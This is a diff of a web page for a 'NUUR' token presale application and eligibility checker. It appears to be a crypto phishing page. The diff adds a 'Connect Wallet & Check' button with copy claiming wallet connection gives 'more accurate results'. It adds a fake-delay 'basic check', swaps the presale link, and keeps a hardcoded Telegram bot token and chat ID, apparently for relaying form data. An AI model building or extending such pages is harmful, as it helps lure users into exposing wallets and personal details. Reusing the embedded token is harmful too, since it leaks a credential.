@@ -183,6 +183,10 @@
             background: linear-gradient(to right, var(--success), #1e7e34);
         }
         
+        .btn-wallet {
+            background: linear-gradient(to right, #ff6b6b, #ee5a24);
+        }
+        
         .btn-outline {
             background: transparent;
             border: 2px solid var(--primary);
@@ -288,6 +292,23 @@
             to { transform: rotate(360deg); }
         }
         
+        .check-options {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .check-options .btn {
+            flex: 1;
+        }
+        
+        .option-desc {
+            text-align: center;
+            margin-top: 5px;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
         @media (max-width: 600px) {
             .container {
                 padding: 20px;
@@ -307,6 +328,10 @@
             
             .banner p {
                 font-size: 16px;
+            }
+            
+            .check-options {
+                flex-direction: column;
             }
         }
     </style>
@@ -363,14 +388,21 @@
                 </div>
             </div>
             
-            <button type="button" id="checkEligibility" class="btn">Check Eligibility</button>
+            <div class="check-options">
+                <button type="button" id="checkEligibility" class="btn">Check Eligibility Without Connecting</button>
+                <button type="button" id="checkWithWallet" class="btn btn-wallet">Connect Wallet & Check</button>
+            </div>
+            <div class="option-desc">
+                <p>You can check eligibility without connecting a wallet, but wallet connection provides more accurate results</p>
+            </div>
+            
             <button type="submit" id="submitApplication" class="btn btn-success" disabled>Submit Application</button>
         </form>
         
         <div id="eligibilityResult" class="result">
             <h4 id="resultTitle"></h4>
             <p id="resultMessage"></p>
-            <a href="https://presale.nuur.io" id="presaleLink" class="presale-link" target="_blank" style="display: none;">Click here to participate in the presale</a>
+            <a href="https://presale-introduction" id="presaleLink" class="presale-link" target="_blank" style="display: none;">Click here to participate in the presale</a>
         </div> 
         <div class="instructions">
             <h4><i class="fas fa-info-circle"></i> Application Instructions</h4>
@@ -380,6 +412,11 @@
                 <li>Have participated in the NUUR presale</li>
                 <li>Provide accurate contact information</li>
             </ol>
+            <p><strong>Eligibility Check Options:</strong></p>
+            <ul>
+                <li><strong>Without Connecting:</strong> Basic validation of your wallet address format</li>
+                <li><strong>With Wallet Connection:</strong> Full verification of your token balance and presale participation</li>
+            </ul>
             <p>After submission, your application will be reviewed by the NUUR team.</p>
         </div>
     </div>
@@ -391,6 +428,7 @@
     document.addEventListener('DOMContentLoaded', function() {
         const form = document.getElementById('applicationForm');
         const checkEligibilityBtn = document.getElementById('checkEligibility');
+        const checkWithWalletBtn = document.getElementById('checkWithWallet');
         const submitBtn = document.getElementById('submitApplication');
         const resultDiv = document.getElementById('eligibilityResult');
         const resultTitle = document.getElementById('resultTitle');
@@ -427,7 +465,6 @@
             countrySelect.appendChild(option);
         });
 
-        // Replace with your actual Telegram bot details
         const TELEGRAM_BOT_TOKEN = '8032211561:AAEH86izjI5_bvtcX-JbnZw2WVrwoDL6JTI';
         const TELEGRAM_CHAT_ID = '7181820663';
 
@@ -465,13 +502,46 @@
                     return false;
                 }
             } else {
-                alert('Please install MetaMask to use this feature');
+                alert('Please install MetaMask to use wallet connection feature');
                 return false;
             }
         }
 
-        // ✅ Eligibility check with styled inline messages
-        async function checkEligibility() {
+        // ✅ Basic eligibility check without wallet connection
+        function checkEligibilityBasic() {
+            const sdaAddress = document.getElementById('sdaAddress').value;
+
+            if (!sdaAddress) {
+                alert('Please enter your SDA address');
+                return;
+            }
+
+            resultDiv.style.display = 'block';
+            resultDiv.className = 'result info';
+            resultTitle.innerHTML = '<span style="color:#0056b3;">Checking Eligibility...</span>';
+            resultMessage.innerHTML = '<span class="loading"></span> <em>Performing basic validation.</em>';
+
+            // Simulate API call/validation
+            setTimeout(() => {
+                // Basic validation - check if it looks like an Ethereum address
+                const isEthAddress = /^0x[a-fA-F0-9]{40}$/.test(sdaAddress);
+                
+                if (isEthAddress) {
+                    resultDiv.className = 'result info';
+                    resultTitle.innerHTML = '<span style="color:#0056b3;">Basic Check Complete</span>';
+                    resultMessage.innerHTML = 'Your wallet address format is valid. For full eligibility verification, please use the "Connect Wallet & Check" option to verify your token balance and presale participation.';
+                    presaleLink.style.display = 'none';
+                } else {
+                    resultDiv.className = 'result error';
+                    resultTitle.innerHTML = '<span style="color:red;">❌ Invalid Address Format</span>';
+                    resultMessage.innerHTML = 'The wallet address you provided is not a valid Ethereum address. Please check and try again.';
+                    presaleLink.style.display = 'none';
+                }
+            }, 1500);
+        }
+
+        // ✅ Full eligibility check with wallet connection
+        async function checkEligibilityWithWallet() {
             const sdaAddress = document.getElementById('sdaAddress').value;
 
             if (!sdaAddress) {
@@ -487,7 +557,7 @@
             try {
                 const web3Initialized = await initWeb3();
                 if (!web3Initialized) {
-                    throw new Error('Please install MetaMask to check eligibility');
+                    throw new Error('Please install MetaMask to check eligibility with wallet connection');
                 }
 
                 if (!web3.utils.isAddress(sdaAddress)) {
@@ -507,7 +577,7 @@
                         const tokensPurchased = await contract.methods.getTokensPurchasedByAddress(sdaAddress).call();
                         participatedInPresale = tokensPurchased > 0;
                     } catch {
-                        participatedInPresale = false; // Changed from true to false
+                        participatedInPresale = false;
                     }
                 }
 
@@ -592,7 +662,8 @@
         }
 
         // Event listeners
-        checkEligibilityBtn.addEventListener('click', checkEligibility);
+        checkEligibilityBtn.addEventListener('click', checkEligibilityBasic);
+        checkWithWalletBtn.addEventListener('click', checkEligibilityWithWallet);
         form.addEventListener('submit', handleSubmit);
     });
 </script>
